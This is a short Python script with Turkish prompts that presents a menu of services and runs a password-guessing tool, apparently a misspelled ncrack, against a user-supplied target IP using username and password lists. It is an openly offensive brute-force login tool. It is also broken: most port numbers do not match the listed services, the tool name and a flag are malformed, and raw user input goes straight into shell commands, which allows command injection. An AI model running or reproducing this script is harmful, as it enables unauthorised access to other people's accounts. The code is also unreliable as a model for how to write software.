#!/usr/bin/env python
import os
os.system("apt-get install figlet")
os.system("clear")
os.system("figlet Brute Force")
print(""" 
BRUTE FORCE 
1)FTP
2)SSH
3)TELNET
4)HTTP
5)SMB
6)ROP
7)SIP
8)Redis
9)VNC
10)PostgreSQL
11)MySQL
""")
islem_no = input("İslem Numarası Girin: " ) 
hedef_ip = input("Hedef Ip Girin: ")
kullaniciadi = input("Kullanici Adi Dosya Yolu: ")
sifre= input("Sifrelerin Bulunduğu Dosya Yolu: ")
if(islem_no == "1"):
   os.system("nrack -p 21 -u" + kullaniciadi + " -P " + sifre + " " + hedef_ip )
  
elif(islem_no == "2"):
   os.system("nrack -p 22 -u" + kullaniciadi + " -P " + sifre + " " + hedef_ip )
elif(islem_no == "3"):
   os.system("nrack -p 23 -u" + kullaniciadi + " -P " + sifre + " " + hedef_ip )
elif(islem_no == "4"):
   os.system("nrack -p 24 -u" + kullaniciadi + " -P " + sifre + " " + hedef_ip )
elif(islem_no == "5"):
   os.system("nrack -p 25 -u" + kullaniciadi + " -P " + sifre + " " + hedef_ip )
elif(islem_no == "6"):
   os.system("nrack -p 26 -u" + kullaniciadi + " -P " + sifre + " " + hedef_ip )
elif(islem_no == "7"):
   os.system("nrack -p 27 -u" + kullaniciadi + " -P " + sifre + " " + hedef_ip )
elif(islem_no == "8"):
   os.system("nrack -p 28 -u" + kullaniciadi + " -P " + sifre + " " + hedef_ip )
elif(islem_no == "9"):
   os.system("nrack -p 29 -u" + kullaniciadi + " -P " + sifre + " " + hedef_ip )
elif(islem_no == "10"):
   os.system("nrack -p 210 -u" + kullaniciadi + " -P " + sifre + " " + hedef_ip )
elif(islem_no == "11"):
   os.system("nrack -p 211 -u" + kullaniciadi + " -P " + sifre + " " + hedef_ip )
else:
    print("Hatalı seçim:	")
